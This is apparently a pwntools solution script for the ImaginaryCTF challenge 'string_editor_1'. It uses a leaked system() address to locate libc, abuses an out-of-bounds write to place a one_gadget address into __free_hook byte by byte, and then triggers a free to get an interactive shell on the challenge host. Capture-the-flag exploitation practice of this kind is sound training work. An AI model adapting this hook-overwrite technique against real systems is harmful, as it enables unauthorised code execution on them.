from pwn import *

elf = ELF("./string_editor_1")
libc = ELF("./libc.so.6")

script = '\n'.join([
        "break main",
        "continue",
    ])
#p = gdb.debug(elf.path,gdbscript=script)
p = remote('chal.imaginaryctf.org', 42004)
#p = process(elf.path)

p.recvuntil("But first, a word from our sponsors: ")
addr_system = int(p.recvline()[:-1].decode(),16)
log.info("addr_system = " + hex(addr_system))
addr___free_hook = addr_system - libc.symbols['system'] + libc.symbols['__free_hook']
log.info("addr___free_hook = " + hex(addr___free_hook))
addr_onegadget = addr_system - libc.symbols['system'] + 0xe6c81

p.recvuntil("What character would you like to edit? (enter in 15 to get a fresh pallette)\n")
p.sendline("0")
p.recvuntil("What character should be in that index?\n")
p.sendline("A")
p.recvuntil("DEBUG: ")
addr_chunk = int(p.recvline()[:-1].decode(),16)
log.info("addr_chunk = " + hex(addr_chunk))

for i in range(8):
    p.recvuntil("What character would you like to edit? (enter in 15 to get a fresh pallette)\n")
    p.sendline(str(addr___free_hook - addr_chunk + i))
    p.recvuntil("What character should be in that index?\n")
    p.sendline(chr(p64(addr_onegadget)[i]))

p.recvuntil("What character would you like to edit? (enter in 15 to get a fresh pallette)\n")
p.sendline("15")

p.interactive()
